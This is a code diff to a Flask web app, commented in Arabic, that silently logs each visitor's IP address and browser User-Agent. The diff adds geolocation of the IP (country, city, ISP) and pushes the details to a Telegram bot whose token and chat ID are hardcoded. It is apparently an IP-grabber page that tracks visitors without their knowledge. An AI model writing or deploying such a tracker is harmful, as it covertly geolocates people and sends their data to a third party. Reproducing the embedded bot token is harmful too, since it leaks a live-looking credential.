@@ -7,6 +7,25 @@ app = Flask(__name__)
 TELEGRAM_BOT_TOKEN = "8972111633:AAFyA1hbPsVzMwM1ZzduSCnufgtOwWJ6b9g"
 TELEGRAM_CHAT_ID = "960871923"
 
+def get_ip_info(ip):
+    # تجاهل الأيبيهات المحلية إذا تم الاختبار من الجهاز نفسه
+    if ip in ["127.0.0.1", "localhost"]:
+        return "شبكة محلية (Localhost)"
+    
+    try:
+        # جلب البيانات الجغرافية للـ IP مجاناً
+        response = requests.get(f"http://ip-api.com/json/{ip}?lang=ar", timeout=3)
+        data = response.json()
+        if data.get("status") == "success":
+            country = data.get("country", "غير معروف")
+            city = data.get("city", "غير معروف")
+            isp = data.get("isp", "غير معروف")
+            return f"🌍 الدولة: {country}\n🏙️ المدينة: {city}\n🏢 المزود: {isp}"
+    except Exception as e:
+        print(f"Error fetching IP info: {e}")
+    
+    return "تعذر جلب معلومات الموقع"
+
 def send_telegram_message(message):
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     payload = {
@@ -21,12 +40,17 @@ def send_telegram_message(message):
 
 @app.route('/')
 def index():
-    # جمع بيانات الجهاز والمتصفح
+    # جمع بيانات الجهاز والمتصفح والـ IP
     user_agent = request.headers.get('User-Agent', 'Unknown')
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    if ip and ',' in ip:
+        ip = ip.split(',')[0].strip()
+        
+    # جلب معلومات الموقع الجغرافي بناءً على الـ IP
+    geo_info = get_ip_info(ip)
     
-    # إرسال التنبيه فوراً لتيليجرام
-    msg = f"🚨 *زيارة جديدة للموقع!*\n\n🌐 *IP:* `{ip}`\n💻 *User-Agent:* `{user_agent}`"
+    # إرسال التنبيه المفصل لتيليجرام
+    msg = f"🚨 *زيارة جديدة للموقع!*\n\n🌐 *IP:* `{ip}`\n{geo_info}\n\n💻 *User-Agent:* `{user_agent}`"
     send_telegram_message(msg)
     
     # تصميم الصفحة اللي تظهر للزوار
